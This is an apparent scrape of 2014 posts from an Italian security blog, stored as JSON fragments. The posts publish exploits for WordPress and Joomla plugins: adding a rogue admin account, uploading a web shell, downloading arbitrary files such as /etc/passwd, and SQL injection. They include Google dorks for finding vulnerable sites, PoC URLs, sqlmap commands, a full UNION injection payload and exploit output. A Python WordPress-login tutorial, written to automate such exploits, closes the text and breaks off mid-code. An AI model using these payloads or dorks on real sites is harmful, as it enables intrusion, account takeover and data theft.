--|\r|. / \\ |_____|__| |_____| __|__| |_____|_____|_____|\r|: | ______ |__| __ __\r|::.|:. | | _ \\ .-----.--.--.--.-----| .-----.---.-.--| |\r`--- ---\u0026#39; |. | \\| _ | | | | | | _ | _ | _ |\r|. | |_____|________|__|__|__|_____|___._|_____|\r|: 1 / ___ ___\r|::.. . / | Y .---.-.-----.---.-.-----.-----.----.\r`------\u0026#39; |. | _ | | _ | _ | -__| _|\r|. \\_/ |___._|__|__|___._|___ |_____|__|\r|: | | |_____|\r|::.|:. |\r`--- ---\u0026#39;\rWordPress Download Manager\rR3m0t3 C0d3 Ex3cut10n\r(Add WP Admin)\rv2.7.0-2.7.4\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[+] Tryng to connect to: http://10.0.0.67/wordpress\r[!] Account Added\r[!] Location: http://10.0.0.67/wordpress/wp-login.php\r[!] Username: r7Uo4v\r[!] Password: YN1G1F    Google Dork WordPress Download Manager index of \u0026ldquo;download-manager\u0026rdquo;\nDownload Download Exploit: HERE\nExploit Usage claudio@backbox3:~$ python wp_download_manager_274_add_admin.py -t http[s]://localhost[:PORT]\rpython wp_download_manager_274_add_admin.py -t http[s]://localhost[:PORT]/basedir ","permalink":"https://www.homelab.it/index.php/2014/12/13/wordpress-download-manager-rce/","summary":"___ ___ __\r| Y .-----.----.--| .-----.----.-----.-----.-----.\r|. | | _ | _| _ | _ | _| -__|__ --|__ --|\r|. / \\ |_____|__| |_____| __|__| |_____|_____|_____|\r|: | ______ |__| __ __\r|::.|:. | | _ \\ .-----.--.--.--.-----| .-----.---.-.--| |\r`--- ---\u0026#39; |. | \\| _ | | | | | | _ | _ | _ |\r|. | |_____|________|__|__|__|_____|___._|_____|\r|: 1 / ___ ___\r|::.. .","title":"WordPress Download Manager Remote Code Execution Vulnerability (Add WP Admin)"},{"content":" ___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \\ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---\u0026#39; ___ ___ _______ _______ __ | Y | _ |______| _ .--.--.--------.-----.-----.-----|__.--.--.--------. |. | |. 1 |______| 1___| | | | _ | _ |__ --| | | | | |. / \\ |. ____| |____ |___ |__|__|__| __|_____|_____|__|_____|__|__|__| |: |: | |: 1 |_____| |__| |::.|:. |::.| |::.. . | `--- ---`---\u0026#39; `-------\u0026#39; Wp-Symposium Sh311 Upl04d Vuln3r4b1l1ty v14.11 Written by: Claudio Viviani http://www.homelab.it info@homelab.it homelabit@protonmail.ch https://www.facebook.com/homelabit https://twitter.com/homelabit https://plus.google.com/+HomelabIt1/ https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww [!] Shell Uploaded [!] Location: http://10.0.0.67/wordpress/wp-content/plugins/wp-symposium/server/php/IdqxLEKxLh5n.php    Google Dork WordPress Wp Symposium index of \u0026ldquo;wp-symposium\u0026rdquo;\nDownload Download Exploit: HERE\nExploit Usage claudio@backbox3:~$ python wp_symposium_1411_shell_upload.py -t http[s]://localhost[:PORT] -f filname python wp_symposium_1411_shell_upload.py -t http[s]://localhost[:PORT]/basedir -f filename ","permalink":"https://www.homelab.it/index.php/2014/12/11/wordpress-wp-symposium-shell-upload/","summary":"___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \\ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---\u0026#39; ___ ___ _______ _______ __ | Y | _ |______| _ .--.--.--------.-----.-----.-----|__.--.--.--------. |. | |. 1 |______| 1___| | | | _ | _ |__ --| | | | | |. / \\ |. ____| |____ |___ |__|__|__| __|_____|_____|__|_____|__|__|__| |: |: | |: 1 |_____| |__| |::.","title":"WordPress WP Symposium Shell Upload Vulnerability"},{"content":"######################\r# Exploit Title : WordPress Ajax Store Locator \u0026lt;= 1.2 Arbitrary File Download\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://codecanyon.net/item/ajax-store-locator-wordpress/5293356\r# Software Link : Premium\r# Dork Google: inurl:ajax-store-locator\r# index of ajax-store-locator # Date : 2014-12-06\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# PoC Exploit:\rhttp://TARGET/wp-content/plugins/ajax-store-locator-wordpress/sl_file_download.php?download_file=[../../nomefile]\ror\rhttp://TARGET/wp-content/plugins/codecanyon-5293356-ajax-store-locator-wordpress/sl_file_download.php?download_file=[../../nomefile]\r\u0026#34;download_file\u0026#34; variable is not sanitized.\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/12/06/wordpress-ajax-store-locator-arbitrary-file-download-vulnerability/","summary":"######################\r# Exploit Title : WordPress Ajax Store Locator \u0026lt;= 1.2 Arbitrary File Download\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://codecanyon.net/item/ajax-store-locator-wordpress/5293356\r# Software Link : Premium\r# Dork Google: inurl:ajax-store-locator\r# index of ajax-store-locator # Date : 2014-12-06\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# PoC Exploit:\rhttp://TARGET/wp-content/plugins/ajax-store-locator-wordpress/sl_file_download.php?download_file=[../../nomefile]\ror\rhttp://TARGET/wp-content/plugins/codecanyon-5293356-ajax-store-locator-wordpress/sl_file_download.php?download_file=[../../nomefile]\r\u0026#34;download_file\u0026#34; variable is not sanitized.\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.","title":"WordPress Ajax Store Locator Arbitrary File Download Vulnerability"},{"content":"claudio@backbox3:~/claudio$ python wpdatatables_shell_up.py -t http://10.0.0.67/wordpress -f shell.php ___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \\ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---\u0026#39; ___ ___ ______ __ _______ __ __ | Y .-----| _ \\ .---.-| |_.---.-| .---.-| |--| .-----.-----. |. | | _ |. | \\| _ | _| _ |.| | | _ | _ | | -__|__ --| |. / \\ | __|. | |___._|____|___._`-|. |-|___._|_____|__|_____|_____| |: |__| |: 1 / |: | |::.|:. | |::.. . / |::.| `--- ---\u0026#39; `------\u0026#39; `---\u0026#39; Sh311 Upl04d Vuln3r4b1l1ty \u0026lt;= 1.5.3 Written by: Claudio Viviani http://www.homelab.it info@homelab.it homelabit@protonmail.ch https://www.facebook.com/homelabit https://twitter.com/homelabit https://plus.google.com/+HomelabIt1/ https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww [!] Shell Uploaded [!] Location: http://10.0.0.67/wordpress/wp-content/uploads/2014/11/shell.php claudio@backbox3:~/claudio$    Google Dork WordPress WpDataTables inurl:/plugins/wpdatatables\ninurl:codecanyon-3958969\nindex of \u0026ldquo;wpdatatables\u0026rdquo;\nindex of \u0026ldquo;codecanyon-3958969\u0026rdquo;\nDownload Download Exploit: HERE\nExploit Usage claudio@backbox3:~$ python wpdatatables_shell_up.py -t http[s]://localhost[:PORT] -f filname python wpdatatables_shell_up.py -t http[s]://localhost[:PORT]/basedir -f filename ","permalink":"https://www.homelab.it/index.php/2014/11/23/wordpress-wpdatatables-shell-upload-vulnerability/","summary":"claudio@backbox3:~/claudio$ python wpdatatables_shell_up.py -t http://10.0.0.67/wordpress -f shell.php ___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \\ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---\u0026#39; ___ ___ ______ __ _______ __ __ | Y .-----| _ \\ .---.-| |_.---.-| .---.-| |--| .-----.-----. |. | | _ |. | \\| _ | _| _ |.","title":"WordPress wpDataTables 1.5.3 and below Unauthenticated Shell Upload Vulnerability"},{"content":"######################\r# Exploit Title : WordPress wpDataTables 1.5.3 and below SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani # Software Link : http://wpdatatables.com (Premium)\r# Date : 2014-11-22\r# Tested on : Windows 7 / Mozilla Firefox\rWindows 7 / sqlmap (0.8-1)\rLinux / Mozilla Firefox\rLinux / sqlmap 1.0-dev-5b2ded0\r######################\r# Description\rWordpress wpDataTables 1.5.3 and below suffers from SQL injection vulnerability\r\u0026#34;table_id\u0026#34; variable is not sanitized.\rFile: wpdatatables.php\r------------------------\r// AJAX-handlers\radd_action( \u0026#39;wp_ajax_get_wdtable\u0026#39;, \u0026#39;wdt_get_ajax_data\u0026#39; );\radd_action( \u0026#39;wp_ajax_nopriv_get_wdtable\u0026#39;, \u0026#39;wdt_get_ajax_data\u0026#39; );\r/**\r* Handler which returns the AJAX response\r*/\rfunction wdt_get_ajax_data(){\r$id = $_GET[\u0026#39;table_id\u0026#39;]; \u0026lt;------------------- Not Sanitized!\r$table_data = wdt_get_table_by_id( $id );\r$column_data = wdt_get_columns_by_table_id( $id );\r$column_headers = array();\r$column_types = array();\r$column_filtertypes = array();\r$column_inputtypes = array();\rforeach($column_data as $column){\r$column_order[(int)$column-\u0026gt;pos] = $column-\u0026gt;orig_header;\rif($column-\u0026gt;display_header){\r$column_headers[$column-\u0026gt;orig_header] = $column-\u0026gt;display_header;\r}\rif($column-\u0026gt;column_type != \u0026#39;autodetect\u0026#39;){\r$column_types[$column-\u0026gt;orig_header] = $column-\u0026gt;column_type;\r}else{\r$column_types[$column-\u0026gt;orig_header] = \u0026#39;string\u0026#39;;\r} $column_filtertypes[$column-\u0026gt;orig_header] = $column-\u0026gt;filter_type;\r$column_inputtypes[$column-\u0026gt;orig_header] = $column-\u0026gt;input_type;\r}\r------------------------\r(The vulnerable variable is located in others php files)\r######################\r# PoC\rhttp://TARGET/wp-admin/admin-ajax.php?action=get_wdtable\u0026amp;table_id=1 [Sqli]\r# Sqlmap\rsqlmap -u \u0026#34;http://TARGET/wp-admin/admin-ajax.php?action=get_wdtable\u0026amp;table_id=1\u0026#34; -p table_id --dbms mysql\r---\rParameter: table_id\rType: boolean-based blind\rTitle: AND boolean-based blind - WHERE or HAVING clause\rPayload: action=get_wdtable\u0026amp;table_id=1 AND 9029=9029\rType: AND/OR time-based blind\rTitle: MySQL \u0026gt; 5.0.11 AND time-based blind\rPayload: action=get_wdtable\u0026amp;table_id=1 AND SLEEP(5)\r---\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/11/23/wordpress-wpdatatables-sql-injection-vulnerability/","summary":"######################\r# Exploit Title : WordPress wpDataTables 1.5.3 and below SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani # Software Link : http://wpdatatables.com (Premium)\r# Date : 2014-11-22\r# Tested on : Windows 7 / Mozilla Firefox\rWindows 7 / sqlmap (0.8-1)\rLinux / Mozilla Firefox\rLinux / sqlmap 1.0-dev-5b2ded0\r######################\r# Description\rWordpress wpDataTables 1.5.3 and below suffers from SQL injection vulnerability\r\u0026#34;table_id\u0026#34; variable is not sanitized.\rFile: wpdatatables.","title":"WordPress wpDataTables SQL Injection Vulnerability"},{"content":"Info # Exploit Title : Joomla HD FLV 2.1.0.1 and below Arbitrary File Download Vulnerability\r#\r# Exploit Author : Claudio Viviani\r#\r# Vendor Homepage : http://www.hdflvplayer.net/\r#\r# Software Link : http://www.hdflvplayer.net/download_count.php?pid=5\r#\r# Dork google 1: inurl:/component/hdflvplayer/\r# Dork google 2: inurl:com_hdflvplayer #\r# Date : 2014-11-11\r#\r# Tested on : BackBox 3.x/4.x\r#\r# Info: # Url: http://target/components/com_hdflvplayer/hdflvplayer/download.php?f=\r# The variable \u0026#34;f\u0026#34; is not sanitized.\r# Over 80.000 downloads (statistic reported on official site) Exploit Preview claudio@backbox3:~/claudio$ python j00m_hd_flv_afd.py -t http://target -f /etc/passwd\r_______ __ ___ ___ ______\r| _ .-----.-----.--------| .---.-. | Y | _ \\\r|___| | _ | _ | | | _ | |. 1 |. | \\\r|. | |_____|_____|__|__|__|__|___._| |. _ |. | \\\r|: 1 | |: | |: 1 /\r|::.. . | |::.|:. |::.. . /\r`-------\u0026#39; `--- ---`------\u0026#39;\r_______ ___ ___ ___ _______ __\r| _ | | | Y | | _ | .---.-.--.--.-----.----.\r|. 1___|. | |. | | |. 1 | | _ | | | -__| _|\r|. __) |. |___|. | | |. ____|__|___._|___ |_____|__|\r|: | |: 1 |: 1 | |: | |_____|\r|::.| |::.. . |\\:.. ./ |::.|\r`---\u0026#39; `-------\u0026#39; `---\u0026#39; `---\u0026#39;\r\u0026lt;= 2.1.0.1 4rb1tr4ry F1l3 D0wnl04d\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[+] Searching HD FLV Extension...: FOUND\r[+] Checking Version: 2.1.0.1\r[+] Exploiting...please wait: ######\r[!] VULNERABLE\r[*] 3v1l Url: http://target/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../../../..//etc/passwd\r[+] Do you want [D]ownload or [R]ead the file?\r[+]\r[+] Please respond with \u0026#39;D\u0026#39; or \u0026#39;R\u0026#39;: d\r[!] DOWNLOADED!\r[!] Check file: passwd    Download Download Exploit: HERE\nExploit Usage claudio@backbox3:~$ python j00m_hd_flv_afd.py -t http[s]://localhost[:PORT] -f filname\rpython j00m_hd_flv_afd.py -t http[s]://localhost[:PORT]/basedir -f filename ","permalink":"https://www.homelab.it/index.php/2014/11/15/joomla-hd-flv-player-arbitrary-file-download-vulnerability/","summary":"Info # Exploit Title : Joomla HD FLV 2.1.0.1 and below Arbitrary File Download Vulnerability\r#\r# Exploit Author : Claudio Viviani\r#\r# Vendor Homepage : http://www.hdflvplayer.net/\r#\r# Software Link : http://www.hdflvplayer.net/download_count.php?pid=5\r#\r# Dork google 1: inurl:/component/hdflvplayer/\r# Dork google 2: inurl:com_hdflvplayer #\r# Date : 2014-11-11\r#\r# Tested on : BackBox 3.x/4.x\r#\r# Info: # Url: http://target/components/com_hdflvplayer/hdflvplayer/download.php?f=\r# The variable \u0026#34;f\u0026#34; is not sanitized.\r# Over 80.","title":"Joomla HD FLV Player Arbitrary File Download Vulnerability"},{"content":"Info # Exploit Title : Joomla HD FLV Player 2.1.0.1 and below SQL Injection\r#\r# Exploit Author : Claudio Viviani\r#\r# Vendor Homepage : http://www.hdflvplayer.net/\r#\r# Software Link : http://www.hdflvplayer.net/download_count.php?pid=5\r#\r# Dork google 1: inurl:/component/hdflvplayer/\r# Dork google 2: inurl:com_hdflvplayer #\r# Date : 2014-11-11\r#\r# Tested on : BackBox 3.x/4.x\r#\r# Info: The variable \u0026#34;id\u0026#34; is not sanitized (again)\r# Over 80.000 downloads (statistic reported on official site)\r#\r#\r# Video Demo: http://youtu.be/-EdOQSjAhW8\r#\r# Poc: # http://www.target.it/index.php?option=com_hdflvplayer\u0026amp;id=1[Sqli]\r# http://www.target.it/index.php/component/hdflvplayer/182/title/Blabla-bleblo/id/6 [SQLi]/page/1 (url rewrite)\r#\r# Poc sqlmap:\r# sqlmap -u \u0026#34;http://www.target.it/index.php?option=com_hdflvplayer\u0026amp;id=1\u0026#34; -p id --dbms mysql\r# sqlmap -u \u0026#34;http://www.target.it/index.php/component/hdflvplayer/182/title/Blabla-bleblo/id/6*\u0026#34; --dbms mysql (url rewrite) Exploit Preview claudio@backbox3:~/claudio$ python j00m_hd_flv_sql_injection.py -t http://10.0.0.67/joomla\r_______ __ ___ ___ ______ | _ .-----.-----.--------| .---.-. | Y | _ \\ |___| | _ | _ | | | _ | |. 1 |. | \\ |. | |_____|_____|__|__|__|__|___._| |. _ |. | \\ |: 1 | |: | |: 1 / |::.. . | |::.|:. |::.. . / `-------\u0026#39; `--- ---`------\u0026#39; _______ ___ ___ ___ _______ __ | _ | | | Y | | _ | .---.-.--.--.-----.----.\r|. 1___|. | |. | | |. 1 | | _ | | | -__| _|\r|. __) |. |___|. | | |. ____|__|___._|___ |_____|__| |: | |: 1 |: 1 | |: | |_____| |::.| |::.. . |\\:.. ./ |::.| `---\u0026#39; `-------\u0026#39; `---\u0026#39; `---\u0026#39; \u0026lt;= 2.1.0.1 Sql Injection\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[+] Searching HD FLV Extension...: FOUND\r[+] Checking Version: 2.1.0.1\r[+] Exploiting...please wait: ###################\r[!] VULNERABLE\r[*] Username: pippo@localhost\r[*] 3v1l Url: http://10.0.0.67/joomla/index.php?option=com_hdflvplayer\u0026amp;id=-9404%20UNION%20ALL%20SELECT%20CONCAT%280x68306d336c34623174%2CIFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%2C0x743162346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23\rclaudio@backbox3:~/claudio$    Download Download Exploit: HERE\nExploit Usage claudio@backbox3:~$ python j00m_hd_flv_sql_injection.py -t http[s]://localhost[:PORT]\rpython j00m_hd_flv_sql_injection.py -t http[s]://localhost[:PORT]/basedir ","permalink":"https://www.homelab.it/index.php/2014/11/13/joomla-hd-flv-player-sql-injection-vulnerability/","summary":"Info # Exploit Title : Joomla HD FLV Player 2.1.0.1 and below SQL Injection\r#\r# Exploit Author : Claudio Viviani\r#\r# Vendor Homepage : http://www.hdflvplayer.net/\r#\r# Software Link : http://www.hdflvplayer.net/download_count.php?pid=5\r#\r# Dork google 1: inurl:/component/hdflvplayer/\r# Dork google 2: inurl:com_hdflvplayer #\r# Date : 2014-11-11\r#\r# Tested on : BackBox 3.x/4.x\r#\r# Info: The variable \u0026#34;id\u0026#34; is not sanitized (again)\r# Over 80.000 downloads (statistic reported on official site)\r#\r#\r# Video Demo: http://youtu.","title":"Joomla HD FLV Player SQL Injection Vulnerability"},{"content":"THE PROJECT WAS MOVED TO GITHUB: https://github.com/claudioviviani/wordbrutepress\n","permalink":"https://www.homelab.it/index.php/2014/11/03/wordpress-brute-force-multithreading/","summary":"THE PROJECT WAS MOVED TO GITHUB: https://github.com/claudioviviani/wordbrutepress","title":"WordPress Brute Force Multithreading"},{"content":" Intro Dopo aver pubblicato vari exploit e vulnerabilità, sono tornato a scrivere un articolo dove poter condividere piccole nozioni tecniche che ho acquisito recentemente.\nNegli ultimi mesi mi sono dedicato soprattutto ad analizzare codici php di vari plugins wordpress e alla programmazione in python.\nDato che molte vulnerabilità dei plugins wordpress richiedevano un utente (privilegiato e non) con accesso all’area riservata ho pensato: perché non scrivere gli exploit in python per automatizzare il tutto?\nGoogolando un po ho trovato qualche articolo che faceva riferimento a wordpress e python, ma nella maggior parte dei casi le informazioni si sono ritenute errate o troppo obsolete.\nPer gestire connessioni http o https ho cominciato ad eseguire vari test con le librerie python urllib, urlib2, httplib, httplib2 e request fino a quando non ho trovato il perfetto binomio:\nurllib e httplib2\nurllib2 per codificare i dati da spedire al server web tramite metodo POST e httplib2 per gestire le connessioni con i protocolli http e https.\nDopo alcune verifiche ho notato che la libreria httplib2 sembrerebbe gestire in maniera corretta i vari redirect che vengono eseguiti dalle pagine di wordpress, in particolare quella di login.\nRequisiti Personalmente ho eseguito questi test su CentOS 5.10, CentOS 6.5, BackBox 3.x e Kalilinux 1.0.x in cui risiedono di default le versioni python 2.4 o 2.6 .\nMentre la libreria urllib è già presente nel pacchetto python, httplib2 va installata manualmente:\nroot@linux-vm:~# pip install httplib2 Per quanto riguarda le versioni di WordPress su cui ho eseguito i test sono: 3.x e soprattutto 4.x.\nSpecifico questo perchè i vecchi codici python che ho trovato in rete funzionavano soltanto con versioni precedenti alla 3.8.\nCodice e commenti Prima di iniziare con la stesura del codice voglio specificare che l’indirizzo url del cms wordpress a cui farò riferimento è: http://10.0.0.67/wordpress e naturalmente dovrà essere sostituito con il vostro.\nLibrerie #!/usr/bin/env python\r#\r# WordPress Authentication with Python\r#\r#\r# 1\rimport urllib, httplib2\r# 2\rimport socket, httplib, sys   Nel primo import richiamo la libreria urllib per codificare il corpo della richiesta di tipologia POST, mentre httplib2 serve ad eseguire la vera e propria connessione verso il webserver.\n  Le librerie del secondo import, socket e httplib, servono a gestire gli eventuali errori di connessione (httplib2 non li supporta tutti nativamente) mentre la libreria sys viene utilizzata per forzare l’uscita dallo script.\n  Variabili di connessione # 1\rusername = \u0026#34;pippo\u0026#34;\rpwd = \u0026#34;pippo\u0026#34;\r# 2\rurl = \u0026#34;http://10.0.0.67/wordpress\u0026#34;\rurl_login = \u0026#34;/wp-login.php\u0026#34;\r# 3\rtimeout = \u0026#34;10\u0026#34;   Dichiaro le variabili username e pwd contenenti la login e password del mio account wordpress\n  Oltre la variabile url contenente il protocollo (http://), l’indirizzo url (10.0.0.67) e l’eventuale base d’installazione di wordpress (/wordpress) dichiaro la variabile url_login specificando la pagina di login.\n  La variabile timeout serve a specificare il tempo di attesa prima di chiudere la connessione verso un server apparentemente non raggiungibile.\n  Creazione body e headers connessione POST # 1\rbody = { \u0026#39;log\u0026#39;:username,\r\u0026#39;pwd\u0026#39;:pwd,\r\u0026#39;wp-submit\u0026#39;:\u0026#39;Login\u0026#39;,\r\u0026#39;testcookie\u0026#39;:\u0026#39;1\u0026#39; }\r# 2\rheaders = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36\u0026#39;,\r\u0026#39;Content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }  Creo il dizionario body contenente tutti i valori richiesti dalla pagina login di wordpress, come si può notare in una sessione intercettata con il plugin Tamper Data di Firefox:  Il valore redirect_to non è obbligatorio.\nNel dizionario headers ho specificato un User-Agent che rispecchi un browser standard e la tipologia del contenuto della connessione (Content-Type).  Connessione e controllo account # 1\rhttp = httplib2.Http(timeout=int(timeout), disable_ssl_certificate_validation=True)\rprint \u0026#34;WordPress Authentication with Python\u0026#34;\r# 2\rtry:\r# 3\rresponse, content = http.request(url+url_login, \u0026#39;POST\u0026#39;, headers=headers, body=urllib.urlencode(body))\r# 4\rif str(response.status)[0] == \u0026#34;4\u0026#34; or str(response.status)[0] == \u0026#34;5\u0026#34;:\rprint(\u0026#39;\\n[X] HTTP error, code: \u0026#39;+str(response.status))\rsys.exit(1)\r# 5\rif \u0026#34;set-cookie\u0026#34; in response:\r# 6\rif response[\u0026#39;set-cookie\u0026#39;].split(\u0026#34; \u0026#34;)[-1] == \u0026#34;httponly\u0026#34;:\rprint(\u0026#39;\\n\u0026#39;)\rprint(\u0026#39;[!] Logged\u0026#39;)\rprint(\u0026#39;[!] Username: \u0026#39;+username+\u0026#39; Password: \u0026#39;+pwd)\relse:\rprint(\u0026#39;[X] Bad username or password\u0026#39;)\relse:\rprint(\u0026#39;[X] Bad username or password\u0026#39;)\r# 7\rexcept socket.timeout:\rprint(\u0026#39;\\n[X] Connection Timeout\u0026#39;)\rsys.exit(1)\rexcept socket.error:\rprint(\u0026#39;\\n[X] Connection Refused\u0026#39;)\rsys.exit(1)\rexcept httplib.ResponseNotReady:\rprint(\u0026#39;\\n[X] Server Not Responding\u0026#39;)\rsys.exit(1)\rexcept httplib2.ServerNotFoundError:\rprint(\u0026#39;\\n[X] Server Not Found\u0026#39;)\rsys.exit(1)\rexcept httplib2.HttpLib2Error:\rprint(\u0026#39;\\n[X] Connection Error!!\u0026#39;)\rsys.exit(1)   Dichiaro la variabile http creando una connessione tramite la libreria httplib2 con l’opzione timeout e il controllo dei certificati ssl disabilitati.\nIn questo modo eventuali connessioni cifrate tramite protocollo https verso server con certificati auto-firmati non saranno terminate.\nL’opzione “disable_ssl_certificate_validation=True” può essere inserita nel codice anche nel caso in cui non vengono effettuate connessioni https.\n  Per gestire eventuali tipologie d’errore durante la connessione, utilizzo l’istruzione try/except.\n  Eseguo la connessione di login tramite richiesta POST e inserisco l’header della risposta da parte del server nella variabile response e il contenuto della pagina dentro la variabile content.\n  Controllo se il server web remoto mi risponde con un codice 4xx o 5xx in modo da poter terminare lo script in caso di messaggi d’errore o accesso negato.\n  Controllo se nell’ header di risposta del server esiste la presenza del Cookie, altrimenti termino lo script. Esempio di risposta:\n  {\u0026#39;status\u0026#39;: \u0026#39;200\u0026#39;, \u0026#39;content-length\u0026#39;: \u0026#39;2850\u0026#39;, \u0026#39;x-powered-by\u0026#39;: \u0026#39;PHP/5.3.3\u0026#39;, \u0026#39;set-cookie\u0026#39;: \u0026#39;wordpress_test_cookie=WP+Cookie+check; path=/wordpress/, wordpress_75aacd302e2a4723897cb1d154c13f77=pippo%7C1415133547%7Cb832e2796416612317d9712b6eeb06c2; path=/wordpress/wp-content/plugins; httponly, wordpress_75aacd302e2a4723897cb1d154c13f77=pippo%7C1415133547%7Cb832e2796416612317d9712b6eeb06c2; path=/wordpress/wp-admin; httponly, wordpress_logged_in_75aacd302e2a4723897cb1d154c13f77=pippo%7C1415133547%7C5c3aad10a4fad0749c5a027d91c7893f; path=/wordpress/; httponly\u0026#39;, \u0026#39;expires\u0026#39;: \u0026#39;Wed, 11 Jan 1984 05:00:00 GMT\u0026#39;, \u0026#39;server\u0026#39;: \u0026#39;Apache/2.2.3 (CentOS)\u0026#39;, \u0026#39;connection\u0026#39;: \u0026#39;close\u0026#39;, \u0026#39;pragma\u0026#39;: \u0026#39;no-cache\u0026#39;, \u0026#39;cache-control\u0026#39;: \u0026#39;no-cache, must-revalidate, max-age=0\u0026#39;, \u0026#39;date\u0026#39;: \u0026#39;Sun, 02 Nov 2014 20:39:06 GMT\u0026#39;, \u0026#39;x-frame-options\u0026#39;: \u0026#39;SAMEORIGIN\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;text/html; charset=UTF-8\u0026#39;}  Tramite il metodo split controllo se nel cookie rilasciato dal server rilevo il campo “httponly“.\nIn caso positivo il processo di login è andato a buon fine, altrimenti termino lo script perchè l’username o password non sono corretti.\n  Controllo il resto delle eccezioni che posso riscontrare durante la connessione tramite l’istruzione except.\n  Conclusione Per completare l’articolo copio il codice completo e il risultato dell’esecuzione dello script.\nCodice #!/usr/bin/env python\r#\r# WordPress Authentication with Python\r#\r#\rimport urllib, httplib2\rimport socket, httplib, sys\rusername = \u0026#34;pippo\u0026#34;\rpwd = \u0026#34;pippo\u0026#34;\rurl = \u0026#34;http://10.0.0.67/wordpress\u0026#34;\rurl_login = \u0026#34;/wp-login.php\u0026#34;\rtimeout = \u0026#34;10\u0026#34;\rbody = { \u0026#39;log\u0026#39;:username,\r\u0026#39;pwd\u0026#39;:pwd,\r\u0026#39;wp-submit\u0026#39;:\u0026#39;Login\u0026#39;,\r\u0026#39;testcookie\u0026#39;:\u0026#39;1\u0026#39; }\rheaders = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36\u0026#39;,\r\u0026#39;Content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }\rhttp = httplib2.Http(timeout=int(timeout), disable_ssl_certificate_validation=True)\rprint \u0026#34;WordPress Authentication with Python\u0026#34;\rtry:\rresponse, content = http.request(url+url_login, \u0026#39;POST\u0026#39;, headers=headers, body=urllib.urlencode(body))\rif str(response.status)[0] == \u0026#34;4\u0026#34; or str(response.status)[0] == \u0026#34;5\u0026#34;:\rprint(\u0026#39;\\n[X] HTTP error, code: \u0026#39;+str(response.status))\rsys.exit(1)\rprint response\rif \u0026#34;set-cookie\u0026#34; in response:\rif response[\u0026#39;set-cookie\u0026#39;].split(\u0026#34; \u0026#34;)[-1] == \u0026#34;httponly\u0026#34;:\rprint(\u0026#39;\\n\u0026#39;)\rprint(\u0026#39;[!] Logged\u0026#39;)\rprint(\u0026#39;[!] Username: \u0026#39;+username+\u0026#39; Password: \u0026#39;+pwd) else:\rprint(\u0026#39;[X] Bad username or password\u0026#39;)\relse:\rprint(\u0026#39;[X] Bad username or password\u0026#39;)\rexcept socket.timeout:\rprint(\u0026#39;\\n[X] Connection Timeout\u0026#39;)\rsys.exit(1)\rexcept socket.error:\rprint(\u0026#39;\\n[X] Connection Refused\u0026#39;)\rsys.exit(1)\rexcept httplib.ResponseNotReady:\rprint(\u0026#39;\\n[X] Server Not Responding\u0026#39;)\rsys.exit(1)\rexcept 